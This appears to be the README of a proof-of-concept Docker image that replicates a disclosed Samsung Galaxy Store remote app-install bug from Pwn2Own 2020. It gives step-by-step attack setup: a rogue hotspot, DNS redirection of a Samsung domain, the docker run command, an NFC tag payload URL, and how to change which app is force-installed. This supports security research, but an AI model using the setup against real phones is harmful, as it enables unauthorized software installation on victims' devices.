# pwn2own2020-mitmInstallApp-docker

Docker image that replicates the issue disclosed at https://labs.f-secure.com/blog/samsung-s20-rce-via-samsung-galaxy-store-app/.

This PoC will:

* Host a hotspot called "yaytestyay"
* Redirect all traffic to "img.samsungapps.com" to the hotspot's default gateway IP address
* Host a web server which will host "img.samsungapps.com" traffic
* Install The Weather Channel application

Requires that your device is running the Galaxy Store version 4.5.19.13 (lower versions might work too). If you're running a higher version of the Galaxy Store, you can try uninstalling the "updated version" by doing the following:

* Open Settings -> Apps
* Locate "Galaxy Store"
* At the top right, tap the 3 dots above the gear icon
    - If there's no 3 dots above the gear icon, then you're running a version which cannot be uninstalled
* Tap "Uninstall updates" and tap "OK"

To replicate this issue:

* Plug a WiFi adapter that is capable of hosting hotspots into your USB port (I used an Alfa Atheros AR9271)
* Either build this Docker image or pull the image at https://hub.docker.com/r/yogehi/pwn2own2020-mitminstallapp-docker
* Run `docker run -it --privileged --add-host img.samsungapps.com:192.168.50.1 --add-host home.yay:192.168.50.1 -v /dev/bus/usb:/dev/bus/usb --net=host pwn2own2020-mitminstallapp-docker:latest`
** NOTE: the above command will put the Docker image in a privileged state, which is insecure, but I used the above command for convenience
** Run this Docker image in a throwaway VM
* In the Docker image, run the command `pwn` which will start the Apache server and host the hotspot "yaytestyay"
* Connect your phone to the hotspot "yaytestyay"

Then do one of the following:

* Browse to `http://home.yay` and click on the "malicious link"
* Create a NFC tag with the following properties and scan it:
    - Data type: `application/com.sec.android.app.samsungapps.detail`
    - Data payload: `http://apps.samsung.com/appquery/EditorialPage.as?url=http://img.samsungapps.com/yaypayloadyay.html`

If you want to change the app that gets installed, open the file `/html/yaypayloadyay.html` and modify the JavaScript so that `com.weather.samsung` is changed to a different package name that is available on the Galaxy Store.
